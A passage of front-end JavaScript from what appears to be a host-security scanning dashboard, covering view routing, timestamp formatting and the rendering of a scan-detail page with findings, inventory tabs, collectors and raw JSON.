      scans: ["Scans", "Job history, outcomes, and coverage accounting"],
      "scan-detail": ["Scan detail", "Full scan inventory, findings, and collectors"],
      queue: ["Task queue", "Active scan jobs and node workload — Sandfly Task Queues"],
      activity: ["Activity", "Streaming scan progress and operator events"],
      hunt: ["Hunt", "RPL queries over ClickHouse events"],
      "fleet-sift": ["Fleet Sift", "Where's Waldo? — TF-IDF + DBSCAN across the fleet (IronSift)"],
      anomark: ["AnoMark", "Train multiple Markov models, score hosts, auto-check after scans"],
      checks: ["Rules", "Detection catalog — browse, edit, validate, and test rules per scan profile"],
      data: ["Data", "Browse and clear findings, scans, observations, hunt events, virtual ingest, and more"],
      settings: ["Settings", "Versions, digests, ClickHouse, probe limits, and exportable config"],
      "ssh-summary": ["SSH Summary", "Track SSH keys, users, and host access across the fleet"],
      "ssh-graph": ["Access Graph", "Interactive key · user · host graph — drag, pan, zoom"],
      "ssh-zones": ["Security Zones", "Group hosts and keys into audit / alert zones"],
      "ssh-keys": ["Key Investigation", "Investigate SSH public keys, reuse, and weakness"],
      "ssh-users": ["User Investigation", "See which users hold which keys"],
      "ssh-hosts": ["Host Investigation", "SSH key inventory by host"],
      "ssh-tags": ["Tag Workbench", "Bulk tag SSH keys for zones and response"],
    };
    const [t, s] = titles[view] || ["RustMite", ""];
    $("#pageTitle").textContent = t;
    $("#pageSub").textContent = s;
    if (isSsh && !state.ssh) {
      loadSshHunter()
        .then(() => render())
        .catch((e) => toast(e.message));
    }
    if (view === "data") {
      loadDataSummary()
        .then(() => render())
        .catch((e) => toast(e.message));
    }
    if (view === "fleet-sift") {
      Promise.all([refreshSiftRuns(), refreshSiftDetectionConfigs()])
        .then(() => render())
        .catch(() => {});
    }
    if (view === "anomark") {
      refreshAnoMark()
        .then(() => render())
        .catch((e) => toast(e.message || "AnoMark load failed"));
    }
    if (!skipHash
      && !String(location.hash || "").startsWith("#finding/")
      && !String(location.hash || "").startsWith("#host/")
      && !String(location.hash || "").startsWith("#/scans/")) {
      let next = `#/${view}`;
      if (view === "checks" && state.selectedCheckId) {
        next = `#/checks/${encodeURIComponent(state.selectedCheckId)}`;
      }
      if (location.hash !== next) {
        history.replaceState(null, "", next);
      }
    }
    render();
  }

  function findingPermalink(id) {
    const base = `${location.origin}${location.pathname}${location.search}`;
    return `${base}#finding/${encodeURIComponent(id)}`;
  }

  function hostPermalink(id) {
    const base = `${location.origin}${location.pathname}${location.search}`;
    return `${base}#host/${encodeURIComponent(id)}`;
  }

  function scanPermalink(id) {
    const base = `${location.origin}${location.pathname}${location.search}`;
    return `${base}#/scans/${encodeURIComponent(id)}`;
  }

  function scanWhen(scan) {
    const meta = scan?.meta || {};
    const job = scan?.job || {};
    return meta.finished_at || meta.started_at || job.updated_at || "";
  }

  function lookupScan(scanId) {
    if (!scanId) return null;
    return (state.scans || []).find((s) => String(s.job?.id || s.meta?.scan_id || "") === String(scanId)) || null;
  }

  function findingWhen(f) {
    const scan = lookupScan(f.scan_id);
    const meta = scan?.meta || {};
    const job = scan?.job || {};
    const outcomeRaw = meta.outcome;
    let outcome = job.state || "";
    if (typeof outcomeRaw === "string") outcome = outcomeRaw;
    else if (outcomeRaw && typeof outcomeRaw === "object") {
      outcome = outcomeRaw.kind || Object.keys(outcomeRaw)[0] || outcome;
    }
    const finished = meta.finished_at || job.updated_at || f.last_seen || f.first_seen || "";
    const started = meta.started_at || "";
    return {
      seen: f.last_seen || f.first_seen || finished || "",
      first: f.first_seen || "",
      last: f.last_seen || "",
      started,
      finished,
      duration_ms: meta.duration_ms,
      check_set: job.check_set || "",
      outcome,
      scan_state: job.state || "",
      scan,
    };
  }

  function parseTs(ts) {
    if (!ts) return null;
    const s = String(ts).trim();
    if (!s) return null;
    let d = new Date(s);
    if (!Number.isNaN(d.getTime())) return d;
    // ClickHouse / postgres style: "2026-09-16 15:43:20.161788 +00:00:00"
    const norm = s
      .replace(" ", "T")
      .replace(/ \+(\d{2}):(\d{2}):(\d{2})$/, "+$1:$2")
      .replace(/ (\d{2}):(\d{2}):(\d{2})$/, "Z");
    d = new Date(norm);
    if (!Number.isNaN(d.getTime())) return d;
    const isoish = s.replace(" ", "T").replace(/ \+00:00:00$/, "Z").replace(/ \+0000$/, "Z");
    d = new Date(isoish);
    return Number.isNaN(d.getTime()) ? null : d;
  }

  function fmtWhen(ts) {
    if (ts == null || ts === "") return "—";
    if (typeof ts === "number" && Number.isFinite(ts)) {
      // Unix seconds (or ms if large).
      const ms = ts > 1e12 ? ts : ts * 1000;
      return fmtWhen(new Date(ms).toISOString());
    }
    try {
      const d = parseTs(ts);
      if (!d) return String(ts);
      return state.useUtc
        ? d.toISOString().replace("T", " ").replace(/\.\d+Z$/, " UTC")
        : d.toLocaleString(undefined, { hour12: false });
    } catch (_) {
      return String(ts);
    }
  }

  function fmtDuration(ms) {
    if (ms == null || ms === "") return "—";
    const n = Number(ms);
    if (!Number.isFinite(n)) return "—";
    if (n < 1000) return `${Math.round(n)} ms`;
    if (n < 60_000) return `${(n / 1000).toFixed(1)} s`;
    return `${Math.floor(n / 60_000)}m ${Math.round((n % 60_000) / 1000)}s`;
  }

  function attackUrl(tech) {
    const id = String(tech || "").split(".")[0];
    return id ? `https://attack.mitre.org/techniques/${encodeURIComponent(id)}/` : "#";
  }

  function openFindingById(id, opts) {
    if (!id) return false;
    const f = (state.findings || []).find((x) => String(x.id) === String(id));
    if (!f) return false;
    if (!opts || !opts.skipView) setView("findings", { skipHash: true });
    const hash = `#finding/${encodeURIComponent(f.id)}`;
    if (location.hash !== hash) history.replaceState(null, "", hash);
    findingDetail(f);
    return true;
  }

  function formatScanOutcome(outcome) {
    if (outcome == null || outcome === "") return "—";
    if (typeof outcome === "string") return outcome;
    if (typeof outcome === "object") {
      const kind = outcome.kind || Object.keys(outcome)[0] || "";
      if (!kind) return JSON.stringify(outcome);
      const detail = outcome[kind] || outcome.reason || outcome.message || "";
      if (detail && typeof detail === "object") {
        return `${kind}: ${JSON.stringify(detail)}`;
      }
      return detail ? `${kind}: ${detail}` : String(kind);
    }
    return String(outcome);
  }

  function mergeScanFindings(scanId, statusFindings) {
    const map = new Map();
    for (const f of statusFindings || []) {
      if (f && f.id != null) map.set(String(f.id), f);
    }
    for (const f of state.findings || []) {
      if (String(f.scan_id || "") !== String(scanId)) continue;
      if (f && f.id != null) map.set(String(f.id), f);
    }
    return [...map.values()].sort((a, b) => {
      const sa = String(a.severity || "");
      const sb = String(b.severity || "");
      const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
      const da = order[sa.toLowerCase()] ?? 9;
      const db = order[sb.toLowerCase()] ?? 9;
      if (da !== db) return da - db;
      return String(b.last_seen || b.first_seen || "").localeCompare(String(a.last_seen || a.first_seen || ""));
    });
  }

  function severityBreakdown(findings) {
    const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0, other: 0 };
    for (const f of findings || []) {
      const s = String(f.severity || "").toLowerCase();
      if (s in counts) counts[s] += 1;
      else counts.other += 1;
    }
    return counts;
  }

  async function openScanById(id, opts) {
    if (!id) return false;
    const hash = `#/scans/${encodeURIComponent(id)}`;
    if (location.hash !== hash) history.replaceState(null, "", hash);
    state.selectedScanId = id;
    const keepTab = (opts && opts.tab) || state.scanDetail?.tab || "overview";
    try {
      const status = await api(`/v1/scans/${id}`);
      const idx = (state.scans || []).findIndex((s) => String(s.job?.id || "") === String(id));
      if (idx >= 0) state.scans[idx] = status;
      else state.scans = [status, ...(state.scans || [])];

      const job = status.job || {};
      const meta = status.meta || {};
      const hostId = job.host_id || meta.host_id || "";
      const findings = mergeScanFindings(id, status.findings || []);
      let invCounts = { processes: 0, files: 0, connections: 0 };
      if (hostId) {
        const q = hostInventoryScanQuery({ scanId: id });
        const [procPack, filePack, connPack] = await Promise.all([
          api(`/v1/hosts/${hostId}/processes?${q}`).catch(() => null),
          api(`/v1/hosts/${hostId}/files?${q}`).catch(() => null),
          api(`/v1/hosts/${hostId}/connections?${q}`).catch(() => null),
        ]);
        invCounts = {
          processes: Number(procPack?.count ?? (procPack?.processes || []).length ?? 0),
          files: Number(filePack?.count ?? (filePack?.files || []).length ?? 0),
          connections: Number(connPack?.count ?? (connPack?.connections || []).length ?? 0),
        };
      }
      const activity = (state.activity || []).filter((e) => {
        if (hostId && e.host_id && String(e.host_id) !== String(hostId)) return false;
        const msg = String(e.message || "");
        return msg.includes(String(id)) || msg.includes(shortId(id));
      }).slice(0, 80);

      state.scanDetail = {
        id: String(id),
        status,
        findings,
        invCounts,
        activity,
        hostId: String(hostId || ""),
        tab: keepTab,
      };
      // Remember as this host's selected inventory scan too.
      if (hostId) {
        if (!state._hostDetailScanByHost) state._hostDetailScanByHost = {};
        state._hostDetailScanByHost[hostId] = String(id);
        state._hostDetailScanId = String(id);
      }
      closeDrawer();
      if (!opts || !opts.skipView) setView("scan-detail", { skipHash: true });
      else {
        state.view = "scan-detail";
        render();
      }
      const hostLabel = hostId ? hostName(hostId) : "host";
      $("#pageTitle").textContent = `Scan ${shortId(id)}`;
      $("#pageSub").textContent = `${hostLabel} · ${job.check_set || "scan"} · full page`;
      return true;
    } catch (err) {
      toast(err.message || "Scan not found");
      return false;
    }
  }

  function scanDetailPage() {
    const pack = state.scanDetail;
    if (!pack || !pack.status) {
      return `<section class="panel scan-page">
        <div class="empty">No scan selected. Open one from the Scans list or a host’s scan history.</div>
        <div class="form-actions" style="justify-content:center;margin-top:1rem">
          <button type="button" class="btn primary" data-goto="scans">Browse scans</button>
          <button type="button" class="btn ghost" data-goto="hosts">Hosts</button>
        </div>
      </section>`;
    }
    const id = pack.id;
    const status = pack.status;
    const job = status.job || {};
    const meta = status.meta || {};
    const hostId = pack.hostId || job.host_id || meta.host_id || "";
    const findings = pack.findings || [];
    const collectors = meta.collectors || [];
    const delivery = meta.delivery || {};
    const caps = meta.caps || {};
    const sevCounts = severityBreakdown(findings);
    const fired = meta.fired ?? findings.length;
    const applicable = meta.applicable_checks ?? 0;
    const notApplicable = meta.not_applicable ?? 0;
    const passed = applicable
      ? Math.max(0, applicable - Number(fired || 0) - Number(notApplicable || 0))
      : null;
    const when = meta.finished_at || meta.started_at || job.updated_at || "";
    const disp = scanDisplayState({ job, meta });
    const abs = scanPermalink(id);
    const hash = `#/scans/${encodeURIComponent(id)}`;
    const hostHref = hostId ? `#host/${encodeURIComponent(hostId)}` : "#/hosts";
    const invCounts = pack.invCounts || { processes: 0, files: 0, connections: 0 };
    const activity = pack.activity || [];
    const capOn = Object.entries(caps).filter(([, v]) => !!v).map(([k]) => k);
    const outcomeLabel = formatScanOutcome(meta.outcome);
    const tab = pack.tab || "overview";
    const pane = (name) => (tab === name ? "" : "hidden");
    const tabCls = (name) => (tab === name ? "tab active" : "tab");

    return `<section class="panel scan-page">
      <div class="scan-detail">
        <div class="scan-detail-head">
          <div>
            <div class="scan-detail-title">Scan ${esc(shortId(id))}</div>
            <div class="scan-detail-meta">
              <span class="pill neutral">${esc(disp)}</span>
              <span class="muted">${esc(job.check_set || "—")}</span>
              <span class="sep">·</span>
              <a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(hostId)}">${esc(hostName(hostId))}</a>
              <span class="sep">·</span>
              <span class="mono muted">${esc(fmtWhen(when))}</span>
              ${meta.duration_ms != null ? `<span class="sep">·</span><span class="mono muted">${esc(fmtDuration(meta.duration_ms))}</span>` : ""}
            </div>
          </div>
          <div class="scan-detail-actions">
            <button type="button" class="btn ghost tiny" data-goto="scans">All scans</button>
            <button type="button" class="btn ghost tiny" data-copy-scan-link="${esc(abs)}">Copy link</button>
            <button type="button" class="btn ghost tiny" data-goto-host="${esc(hostId)}">Open host</button>
            ${hostId ? `<button type="button" class="btn primary tiny" data-rescan-host="${esc(hostId)}">Rescan</button>` : ""}
          </div>
        </div>

        ${scanPagePickerHtml(hostId, id)}

        <div class="scan-stat-grid">
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(meta.observation_count ?? "—"))}</div><div class="scan-stat-label">Observations</div></div>
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(fired))}${applicable ? `<span class="muted">/${esc(String(applicable))}</span>` : ""}</div><div class="scan-stat-label">Checks fired</div></div>
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(findings.length))}</div><div class="scan-stat-label">Findings</div></div>
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(invCounts.connections))}</div><div class="scan-stat-label">Connections</div></div>
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(invCounts.processes))}</div><div class="scan-stat-label">Processes</div></div>
          <div class="scan-stat"><div class="scan-stat-val">${esc(String(collectors.length))}</div><div class="scan-stat-label">Collectors</div></div>
        </div>

        <div class="host-detail-tabs scan-detail-tabs" role="tablist">
          <button type="button" class="${tabCls("overview")}" data-scan-tab="overview">Overview</button>
          <button type="button" class="${tabCls("findings")}" data-scan-tab="findings">Findings (${findings.length})</button>
          <button type="button" class="${tabCls("processes")}" data-scan-tab="processes">Processes (${invCounts.processes})</button>
          <button type="button" class="${tabCls("files")}" data-scan-tab="files">Files (${invCounts.files})</button>
          <button type="button" class="${tabCls("connections")}" data-scan-tab="connections">Connections (${invCounts.connections})</button>
          <button type="button" class="${tabCls("collectors")}" data-scan-tab="collectors">Collectors (${collectors.length})</button>
          <button type="button" class="${tabCls("activity")}" data-scan-tab="activity">Activity (${activity.length})</button>
          <button type="button" class="${tabCls("raw")}" data-scan-tab="raw">Raw JSON</button>
        </div>

        <div data-scan-pane="overview" class="${pane("overview")}">
          <div class="scan-overview-grid">
            <dl class="kv">
              <dt>Scan ID</dt><dd class="mono"><a class="finding-link" href="${esc(hash)}">${esc(id)}</a></dd>
              <dt>Host</dt><dd><a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(hostId)}">${esc(hostName(hostId))}</a>
                <div class="mono muted" style="font-size:0.75rem">${esc(hostId || "—")}</div></dd>
              <dt>Check set</dt><dd>${esc(job.check_set || "—")}</dd>
              <dt>State / outcome</dt><dd><span class="pill neutral">${esc(disp)}</span>
                <span class="mono muted"> · ${esc(outcomeLabel)}</span></dd>
              <dt>Started</dt><dd class="mono">${esc(fmtWhen(meta.started_at))}</dd>
              <dt>Finished</dt><dd class="mono">${esc(fmtWhen(meta.finished_at || when))}</dd>
              <dt>Duration</dt><dd class="mono">${meta.duration_ms != null ? esc(fmtDuration(meta.duration_ms)) : "—"}
                ${meta.duration_ms != null ? `<span class="muted"> (${esc(String(meta.duration_ms))} ms)</span>` : ""}</dd>
              <dt>Coverage</dt><dd class="mono">fired ${esc(String(fired))}
                · applicable ${esc(String(applicable || "—"))}
                · N/A ${esc(String(notApplicable))}
                ${passed != null ? ` · pass ${esc(String(passed))}` : ""}</dd>
              <dt>Delivery</dt><dd><span class="tag">${esc(delivery.method || "—")}</span>
                ${delivery.fallback_reason ? `<span class="muted"> · fallback ${esc(delivery.fallback_reason)}</span>` : ""}
                <div class="muted" style="font-size:0.75rem">cleanup ${delivery.cleanup_ok === false ? "failed" : "ok"}${delivery.cleanup_forced ? " (forced)" : ""}
                  · bytes ${esc(String(delivery.bytes_transferred ?? meta.bytes_from_probe ?? 0))}</div></dd>
              <dt>Probe</dt><dd class="mono">${esc(meta.probe_version || "—")}
                ${meta.arch ? ` · ${esc(meta.arch)}` : ""}</dd>
              <dt>OS / kernel</dt><dd>${esc(meta.os || "—")}
                <div class="mono muted" style="font-size:0.78rem">${esc([meta.os_id, meta.os_version].filter(Boolean).join(" ") || "—")}
                  · ${esc(meta.kernel || "—")}</div></dd>
              <dt>Boot ID</dt><dd class="mono">${esc(meta.boot_id || "—")}</dd>
              <dt>Node</dt><dd class="mono">${esc(meta.node_id || job.leased_by || "—")}</dd>
              <dt>Attempts</dt><dd class="mono">${esc(String(job.attempts ?? "—"))}
                ${job.priority != null ? ` · priority ${esc(String(job.priority))}` : ""}</dd>
              <dt>Capabilities</dt><dd>${capOn.length
                ? capOn.map((c) => `<span class="tag">${esc(c)}</span>`).join(" ")
                : `<span class="muted">none reported</span>`}</dd>
              <dt>Link</dt><dd class="mono finding-permalink"><a href="${esc(hash)}">${esc(abs)}</a></dd>
            </dl>
            <div class="scan-sev-panel">
              <h3 class="scan-pane-title">Findings by severity</h3>
              <div class="scan-sev-bars">
                ${["critical", "high", "medium", "low", "info"].map((s) => {
                  const n = sevCounts[s] || 0;
                  const max = Math.max(1, findings.length);
                  const pct = Math.round((n / max) * 100);
                  return `<div class="scan-sev-row">
                    <span class="sev ${esc(s)}">${esc(s)}</span>
                    <div class="scan-sev-track"><div class="scan-sev-fill sev-${esc(s)}" style="width:${pct}%"></div></div>
                    <span class="mono">${n}</span>
                  </div>`;
                }).join("")}
              </div>
              <h3 class="scan-pane-title" style="margin-top:1.25rem">Inventory snapshot</h3>
              <dl class="kv">
                <dt>Processes</dt><dd class="mono">${esc(String(invCounts.processes))}</dd>
                <dt>Files</dt><dd class="mono">${esc(String(invCounts.files))}</dd>
                <dt>Connections</dt><dd class="mono">${esc(String(invCounts.connections))}</dd>
                <dt>Observations</dt><dd class="mono">${esc(String(meta.observation_count ?? "—"))}</dd>
              </dl>
            </div>
          </div>
        </div>

        <div data-scan-pane="findings" class="${pane("findings")}">
          <div class="toolbar" style="margin-bottom:0.65rem;gap:0.45rem">
            <input id="scanFindingQ" type="search" placeholder="Filter findings…" style="min-width:16rem" />
            <span class="muted" style="font-size:0.78rem" id="scanFindingCount">${findings.length.toLocaleString()} findings
              ${Number(fired) > findings.length ? ` · meta fired=${esc(String(fired))}` : ""}</span>
          </div>
          <div id="scanFindingsPane">${findings.length
            ? findingsTable(findings, { hideScan: true })
            : `<div class="empty">No findings stored for this scan${Number(fired) > 0 ? ` (meta reports ${esc(String(fired))} fired)` : ""}.</div>`}</div>
        </div>

        <div data-scan-pane="processes" class="${pane("processes")}">
          <div class="muted" style="margin-bottom:0.65rem">Process inventory collected during this scan.</div>
          <div id="hostProcessesPane"><div class="empty">Loading…</div></div>
        </div>
        <div data-scan-pane="files" class="${pane("files")}">
          <div class="muted" style="margin-bottom:0.65rem">File inventory collected during this scan.</div>
          <div id="hostFilesPane"><div class="empty">Loading…</div></div>
        </div>
        <div data-scan-pane="connections" class="${pane("connections")}">
          <div class="muted" style="margin-bottom:0.65rem">Open sockets collected during this scan.</div>
          <div id="hostConnectionsPane"><div class="empty">Loading…</div></div>
        </div>

        <div data-scan-pane="collectors" class="${pane("collectors")}">
          ${!collectors.length ? `<div class="empty">No collector reports on this scan.</div>` : `
          <table class="data"><thead><tr>
            <th>Collector</th><th>Status</th><th>Observations</th><th>Elapsed</th><th>Reason</th>
          </tr></thead><tbody>
            ${collectors.map((c) => `<tr>
              <td class="mono">${esc(c.id || "—")}</td>
              <td><span class="pill neutral">${esc(c.status || "—")}</span></td>
              <td class="mono">${esc(String(c.observations ?? 0))}</td>
              <td class="mono">${c.elapsed_ms != null ? esc(fmtDuration(c.elapsed_ms)) : "—"}</td>
              <td class="muted">${esc(c.reason || "—")}</td>
            </tr>`).join("")}
          </tbody></table>`}
        </div>

        <div data-scan-pane="activity" class="${pane("activity")}">
          ${!activity.length ? `<div class="empty">No activity log lines matched this scan id.</div>` : `
          <div class="live-log host-scan-log">${activity.map((e) => {
            const lvl = (e.level || "info").toLowerCase();
            return `<div class="live-log-line ${esc(lvl)}">
              <span class="mono muted">${esc(fmtWhen(e.ts || e.time || e.created_at))}</span>
              <span class="live-log-msg">${esc(e.message || "")}</span>
            </div>`;
          }).join("")}</div>`}
        </div>

        <div data-scan-pane="raw" class="${pane("raw")}">
          <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
            <button type="button" class="btn ghost" id="btnCopyScanJson">Copy JSON</button>
          </div>
          <pre class="json scan-raw-json" id="scanRawJson">${esc(JSON.stringify(status, null, 2))}</pre>
        </div>
      </div>
    </section>`;
  }

  function bindScanDetailPage() {
    if (state.view !== "scan-detail") return;
    const pack = state.scanDetail;
    if (!pack || !pack.status) return;
    const id = pack.id;
    const hostId = pack.hostId;
    const findings = pack.findings || [];
    const job = pack.status.job || {};
    const abs = scanPermalink(id);
    const root = $("#content");

    const wireFindingRows = (scope) => {
      $$("[data-fid]", scope).forEach((tr) => {
        tr.addEventListener("click", (e) => {
          if (e.target.closest("a, button, [data-stop]")) return;
          openFindingById(tr.getAttribute("data-fid"));
        });
      });
      $$("[data-fid-link]", scope).forEach((a) => {
        a.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          openFindingById(a.getAttribute("data-fid-link"));
        });
      });
      $$("[data-copy-finding]", scope).forEach((btn) => {
        btn.addEventListener("click", async (e) => {
          e.preventDefault();
          e.stopPropagation();
          const url = btn.getAttribute("data-copy-finding") || "";
          try {
            await navigator.clipboard.writeText(url);
            toast("Link copied");
          } catch (_) {
            toast(url);
          }
        });
      });
      $$("[data-goto-host]", scope).forEach((btn) => {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          const hid = btn.getAttribute("data-goto-host");
          if (hid) openHostById(hid).catch((err) => toast(err.message));
          else setView("hosts");
        });
      });
    };

    wireFindingRows(root);

    const scanSel = $("#scanPageSelect");
    if (scanSel) {
      scanSel.addEventListener("change", () => {
        const sid = scanSel.value || "";
        if (sid && sid !== String(id)) {
          openScanById(sid, { tab: state.scanDetail?.tab || "overview" }).catch((err) => toast(err.message));
        }
      });
    }

    const findQ = $("#scanFindingQ");
    if (findQ) {
      findQ.addEventListener("input", () => {
        const q = String(findQ.value || "").toLowerCase().trim();
        const shown = !q ? findings : findings.filter((f) => {
          const hay = [
            f.title, f.check_id, f.severity, f.confidence, f.status,
            ...(f.attack || []),
            JSON.stringify(f.evidence || {}),
          ].join(" ").toLowerCase();
          return hay.includes(q);
        });
        const paneEl = $("#scanFindingsPane");
        const count = $("#scanFindingCount");
        if (paneEl) {
          paneEl.innerHTML = shown.length
            ? findingsTable(shown, { hideScan: true })
            : `<div class="empty">No findings match “${esc(q)}”.</div>`;
          wireFindingRows(paneEl);
        }
        if (count) {
          count.textContent = `${shown.length.toLocaleString()} / ${findings.length.toLocaleString()} findings`;
        }
      });
    }

    const loadTab = (tab) => {
      if (!hostId) return;
      const invOpts = { scanId: id };
      if (tab === "processes") loadHostProcesses(hostId, invOpts);
      if (tab === "files") loadHostFiles(hostId, invOpts);
      if (tab === "connections") loadHostConnections(hostId, invOpts);
    };

    $$("[data-scan-tab]", root).forEach((btn) => {
      btn.addEventListener("click", () => {
        const tab = btn.dataset.scanTab;
        if (state.scanDetail) state.scanDetail.tab = tab;
        $$("[data-scan-tab]", root).forEach((b) => b.classList.toggle("active", b === btn));
        $$("[data-scan-pane]", root).forEach((p) => {
          p.classList.toggle("hidden", p.getAttribute("data-scan-pane") !== tab);
        });
        loadTab(tab);
      });
    });

    // Auto-load inventory if we restored onto an inventory tab.
    loadTab(pack.tab || "overview");

    $$("[data-copy-scan-link]", root).forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        const url = btn.getAttribute("data-copy-scan-link") || abs;
        try {
          await navigator.clipboard.writeText(url);
          toast("Scan link copied");
        } catch (_) {
          toast(url);
        }
      });
    });

    $$("[data-rescan-host]", root).forEach((btn) => {
      btn.addEventListener("click", async () => {
        const hid = btn.getAttribute("data-rescan-host");
        if (!hid) return;
        try {
          await api(`/v1/hosts/${hid}/scan`, {
            method: "POST",
            body: { check_set: job.check_set || "standard", priority: 200 },
          });
          toast("Rescan queued");
          await loadLive();
        } catch (err) {
          toast(err.message);
        }
      });
    });

    const copyJson = $("#btnCopyScanJson");
    if (copyJson) {
      copyJson.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(JSON.stringify(pack.status, null, 2));
          toast("Scan JSON copied");
        } catch (_) {
          toast("Clipboard unavailable");
        }
      });
    }

    $$("[data-goto]", root).forEach((b) => {
      b.addEventListener("click", () => setView(b.dataset.goto));
    });
  }

  function applyLocationHash() {
    const raw = String(location.hash || "").replace(/^#/, "");
    if (raw.startsWith("finding/")) {
      const id = decodeURIComponent(raw.slice("finding/".length).split(/[/?#]/)[0] || "");
      if (id) {
        if (!openFindingById(id)) {
          setView("findings", { skipHash: true });
          toast("Finding not found (yet) — try Refresh");
        }
        return;
      }
    }
    if (raw.startsWith("host/") || raw.startsWith("/hosts/") || raw.startsWith("hosts/")) {
      let id = "";
      if (raw.startsWith("host/")) {
        id = decodeURIComponent(raw.slice("host/".length).split(/[/?#]/)[0] || "");
      } else {
        const rest = raw.replace(/^\//, "");
        id = decodeURIComponent(rest.slice("hosts/".length).split(/[/?#]/)[0] || "");
      }
      if (id && id !== "hosts") {
        openHostById(id).catch((err) => toast(err.message || "Host not found"));
        return;
      }
    }
    if (raw.startsWith("/scans/") || raw.startsWith("scans/")) {
      const rest = raw.replace(/^\//, "");
      const id = decodeURIComponent(rest.slice("scans/".length).split(/[/?#]/)[0] || "");
      if (id) {
        openScanById(id).catch(() => {});
        return;
      }
    }
    const view = raw.startsWith("/") ? raw.slice(1).split(/[/?#]/)[0] : raw.split(/[/?#]/)[0];
    if (view === "checks") {
      const rest = raw.replace(/^\//, "");
      const parts = rest.split(/[/?#]/);
      const ruleId = parts.length > 1 ? decodeURIComponent(parts[1] || "") : "";
      if (state.view !== "checks") setView("checks", { skipHash: true });
      if (ruleId) selectRule(ruleId, { skipHash: true });
      else if (state.selectedCheckId) selectRule(null, { skipHash: true });
      return;
    }
    if (view && view !== state.view) {
      const known = [
        "dashboard", "findings", "hosts", "scans", "queue", "activity", "hunt", "fleet-sift", "anomark", "checks", "data", "settings",
        "ssh-summary", "ssh-graph", "ssh-zones", "ssh-keys", "ssh-users", "ssh-hosts", "ssh-tags",
      ];
      if (known.includes(view)) setView(view, { skipHash: true });
    }
  }

  async function openHostById(id, opts) {
    if (!id) return false;
    if (!opts || !opts.skipView) setView("hosts", { skipHash: true });
    const hash = `#host/${encodeURIComponent(id)}`;
    if (location.hash !== hash) history.replaceState(null, "", hash);
    await showHostDetail(id);
    return true;
  }

  function render() {
    const root = $("#content");
    const views = {
      dashboard, findings, hosts, scans, "scan-detail": scanDetailPage, queue, activity, hunt, "fleet-sift": fleetSift, anomark, checks, data, settings,
      "ssh-summary": sshSummary,
      "ssh-graph": sshGraphPage,
      "ssh-zones": sshZones,
      "ssh-keys": sshKeys,
      "ssh-users": sshUsers,
      "ssh-hosts": sshHostsView,
      "ssh-tags": sshTags,
    };
    root.innerHTML = (views[state.view] || dashboard)();
    bindView();
  }

  function hostScansFor(hostId) {
    if (!hostId) return [];
    return (state.scans || [])
      .filter((s) => {
        const hid = s.job?.host_id || s.meta?.host_id;
        return hid && String(hid) === String(hostId);
      })
      .sort((a, b) => {
        const ta = String(b.meta?.finished_at || b.job?.created_at || b.job?.id || "");
        const tb = String(a.meta?.finished_at || a.job?.created_at || a.job?.id || "");
        return ta.localeCompare(tb);
      });
  }

  function scanPagePickerHtml(hostId, selectedScanId) {
    const hostScans = hostScansFor(hostId);
    if (!hostScans.length) {
      return `<div class="scan-page-picker muted">No other retained scans for this host.</div>`;
    }
    const opts = hostScans.map((s, i) => {
      const j = s.job || {};
      const m = s.meta || {};
      const sid = String(j.id || m.scan_id || "");
      if (!sid) return "";
      const when = m.finished_at || j.created_at || "";
      const setLabel = j.check_set || (m.probe_version === "virtual-import" ? "virtual-import" : "scan");
      const label = `#${i + 1} · ${fmtWhen(when)} · ${setLabel} · ${shortId(sid)}`;
      const sel = String(selectedScanId || "") === sid ? "selected" : "";
      return `<option value="${esc(sid)}" ${sel}>${esc(label)}</option>`;
    }).filter(Boolean).join("");
    return `<div class="scan-page-picker">
      <label>Scan for this host
        <select id="scanPageSelect" class="ml-select" title="Switch to another retained scan for this host">
          ${opts}
        </select>
      </label>
      <span class="muted" style="font-size:0.75rem">${hostScans.length} retained · choose to open that scan’s full page</span>
    </div>`;
  }

  function dashboard() {
    const s = state.summary || {};
    const bySev = s.findings_by_severity || {};
    const q = state.queue || {};
    const recent = findingsSorted(state.findings).slice(0, 8);
    const recentAct = (state.activity || []).slice(0, 8);
    return `
      <div class="stats">
        <div class="stat"><div class="label">Hosts</div><div class="value">${(s.hosts ?? 0).toLocaleString()}</div><div class="hint">${s.nodes ?? 0} nodes · ${s.hosts_never_scanned ?? 0} never scanned</div></div>
        <div class="stat crit"><div class="label">Critical</div><div class="value">${bySev.critical ?? 0}</div><div class="hint">${(s.findings ?? 0).toLocaleString()} findings total</div></div>
        <div class="stat high"><div class="label">High</div><div class="value">${bySev.high ?? 0}</div><div class="hint">${s.hosts_failed_outcome ?? 0} failed outcomes</div></div>
        <div class="stat warn"><div class="label">Live queue</div><div class="value">${activeCount(q)}</div><div class="hint">${q.running || 0} running · ${q.queued || 0} waiting</div></div>
      </div>
      ${scanCommandCenter()}
      <div class="grid-2">
        <section class="panel">
          <div class="panel-head"><h3>Recent alerts</h3><button class="btn ghost" data-goto="findings">View all</button></div>
          ${findingsTable(recent)}
        </section>
        <section class="panel">
          <div class="panel-head"><h3>Live progress feed</h3><button class="btn ghost" data-goto="activity">Activity</button></div>
          ${!recentAct.length ? `<div class="empty">No live events yet</div>` : `
          <table class="data activity-table"><thead><tr><th>When</th><th>Level</th><th>Event</th></tr></thead><tbody>
            ${recentAct.map((e) => `<tr>
              <td class="mono muted">${esc(fmtTime(e.ts))}</td>
              <td class="level-${esc(e.level || "info")}">${esc(e.level)}</td>
              <td>${esc(e.message)}<div class="mono muted" style="font-size:0.72rem">${esc(e.kind)}${e.host_id ? " · " + esc(hostName(e.host_id)) : ""}</div></td>
            </tr>`).join("")}
          </tbody></table>`}
        </section>
      </div>
      <div class="grid-2" style="margin-top:1rem">
        <section class="panel">
          <div class="panel-head"><h3>Fleet by profile</h3></div>
          ${profileBars(s.hosts_by_profile)}
        </section>
